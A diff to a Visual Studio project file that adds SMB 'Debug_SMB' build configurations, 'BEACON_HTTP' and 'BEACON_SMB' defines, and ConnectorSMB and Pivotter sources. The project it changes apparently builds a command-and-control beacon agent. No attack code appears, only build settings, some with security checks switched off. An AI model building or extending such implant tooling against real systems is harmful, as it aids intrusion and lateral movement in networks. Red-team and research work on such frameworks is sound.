@@ -9,6 +9,14 @@
       <Configuration>Debug EXE</Configuration>
       <Platform>x64</Platform>
     </ProjectConfiguration>
+    <ProjectConfiguration Include="Debug_SMB|Win32">
+      <Configuration>Debug_SMB</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Debug_SMB|x64">
+      <Configuration>Debug_SMB</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
     <ProjectConfiguration Include="Release DLL|Win32">
       <Configuration>Release DLL</Configuration>
       <Platform>Win32</Platform>
@@ -88,7 +96,15 @@
     <PlatformToolset>v143</PlatformToolset>
     <UseDebugLibraries>false</UseDebugLibraries>
   </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug_SMB|x64'" Label="Configuration">
+    <PlatformToolset>v143</PlatformToolset>
+    <UseDebugLibraries>false</UseDebugLibraries>
+  </PropertyGroup>
   <PropertyGroup Label="Configuration" Condition="'$(Configuration)|$(Platform)'=='Debug EXE|Win32'">
+    <PlatformToolset>v143</PlatformToolset>
+    <UseDebugLibraries>false</UseDebugLibraries>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug_SMB|Win32'" Label="Configuration">
     <PlatformToolset>v143</PlatformToolset>
     <UseDebugLibraries>false</UseDebugLibraries>
   </PropertyGroup>
@@ -137,7 +153,13 @@
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug EXE|Win32'">
     <LinkIncremental>true</LinkIncremental>
   </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug_SMB|Win32'">
+    <LinkIncremental>true</LinkIncremental>
+  </PropertyGroup>
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug EXE|x64'">
+    <LinkIncremental>true</LinkIncremental>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug_SMB|x64'">
     <LinkIncremental>true</LinkIncremental>
   </PropertyGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release EXE|Win32'">
@@ -288,6 +310,20 @@
       <ConformanceMode>true</ConformanceMode>
     </ClCompile>
   </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug_SMB|Win32'">
+    <Link>
+      <EntryPointSymbol>MainExe</EntryPointSymbol>
+      <SubSystem>Console</SubSystem>
+      <IgnoreAllDefaultLibraries>false</IgnoreAllDefaultLibraries>
+    </Link>
+    <ClCompile>
+      <BufferSecurityCheck>false</BufferSecurityCheck>
+      <RuntimeLibrary>MultiThreadedDLL</RuntimeLibrary>
+      <SDLCheck>false</SDLCheck>
+      <Optimization>Disabled</Optimization>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+  </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug EXE|x64'">
     <Link>
       <EntryPointSymbol>
@@ -302,6 +338,24 @@
       <Optimization>Disabled</Optimization>
       <ConformanceMode>true</ConformanceMode>
       <AdditionalOptions>/D DEBUG %(AdditionalOptions)</AdditionalOptions>
+      <PreprocessorDefinitions>BEACON_HTTP;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+    </ClCompile>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug_SMB|x64'">
+    <Link>
+      <EntryPointSymbol>
+      </EntryPointSymbol>
+      <SubSystem>Console</SubSystem>
+      <IgnoreAllDefaultLibraries>false</IgnoreAllDefaultLibraries>
+    </Link>
+    <ClCompile>
+      <BufferSecurityCheck>false</BufferSecurityCheck>
+      <RuntimeLibrary>MultiThreadedDLL</RuntimeLibrary>
+      <SDLCheck>false</SDLCheck>
+      <Optimization>Disabled</Optimization>
+      <ConformanceMode>true</ConformanceMode>
+      <AdditionalOptions>/D DEBUG %(AdditionalOptions)</AdditionalOptions>
+      <PreprocessorDefinitions>BEACON_SMB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
     </ClCompile>
   </ItemDefinitionGroup>
   <ItemGroup>
@@ -314,6 +368,7 @@
     <ClCompile Include="Commander.cpp" />
     <ClCompile Include="config.cpp" />
     <ClCompile Include="ConnectorHTTP.cpp" />
+    <ClCompile Include="ConnectorSMB.cpp" />
     <ClCompile Include="Crypt.cpp" />
     <ClCompile Include="Downloader.cpp" />
     <ClCompile Include="Encoders.cpp" />
@@ -322,6 +377,7 @@
     <ClCompile Include="MainAgent.cpp" />
     <ClCompile Include="MemorySaver.cpp" />
     <ClCompile Include="Packer.cpp" />
+    <ClCompile Include="Pivotter.cpp" />
     <ClCompile Include="ProcLoader.cpp" />
     <ClCompile Include="Proxyfire.cpp" />
     <ClCompile Include="std.cpp" />
@@ -339,6 +395,7 @@
     <ClInclude Include="Commander.h" />
     <ClInclude Include="config.h" />
     <ClInclude Include="ConnectorHTTP.h" />
+    <ClInclude Include="ConnectorSMB.h" />
     <ClInclude Include="Crypt.h" />
     <ClInclude Include="defines.h" />
     <ClInclude Include="Downloader.h" />
@@ -348,6 +405,7 @@
     <ClInclude Include="MemorySaver.h" />
     <ClInclude Include="ntdll.h" />
     <ClInclude Include="Packer.h" />
+    <ClInclude Include="Pivotter.h" />
     <ClInclude Include="ProcLoader.h" />
     <ClInclude Include="Proxyfire.h" />
     <ClInclude Include="utils.h" />
